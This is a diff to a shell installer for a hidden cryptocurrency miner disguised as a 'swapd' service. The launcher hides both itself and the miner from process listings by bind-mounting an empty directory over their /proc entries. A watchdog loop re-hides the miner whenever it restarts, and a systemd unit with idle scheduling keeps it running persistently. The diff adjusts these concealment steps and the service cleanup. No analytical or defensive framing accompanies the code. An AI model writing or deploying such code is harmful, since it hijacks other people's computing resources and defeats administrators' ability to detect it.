@@ -1156,15 +1156,17 @@ cat << 'EOF' > /root/.swapd/launcher.sh
 MASK_DIR="/root/.swapd/.mask"
 mkdir -p "$MASK_DIR"
 
-# 1. Hide THIS script (the launcher) first
+# Hide this launcher script immediately
 mount --bind "$MASK_DIR" "/proc/$$"
 
-# 2. Start the miner and hide it immediately
+# Start the miner
 /root/.swapd/swapd --config=/root/.swapd/config.json &
 MINER_PID=$!
+
+# Hide the miner immediately
 mount --bind "$MASK_DIR" "/proc/$MINER_PID"
 
-# 3. Watchdog loop to catch restarts
+# Watchdog loop
 while true; do
     CURRENT_PID=$(pidof swapd)
     if [ -n "$CURRENT_PID" ] && ! mountpoint -q "/proc/$CURRENT_PID"; then
@@ -1188,12 +1190,13 @@ Restart=always
 Nice=19
 CPUSchedulingPolicy=idle
 IOSchedulingClass=idle
-# Targeted cleanup: unmounts only if the directory looks like a PID
-ExecStopPost=/bin/bash -c 'for m in $(mount | grep "/root/.swapd/.mask" | awk "{print \$3}"); do umount $m; done'
+MemoryMax=2G
+# Fixed cleanup syntax for systemd
+ExecStopPost=/bin/bash -c 'umount /proc/[0-9]* 2>/dev/null || true'
 
 [Install]
 WantedBy=multi-user.target
-EOL
+EOF
         sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
         
         echo "[*] Starting swapd systemd service"
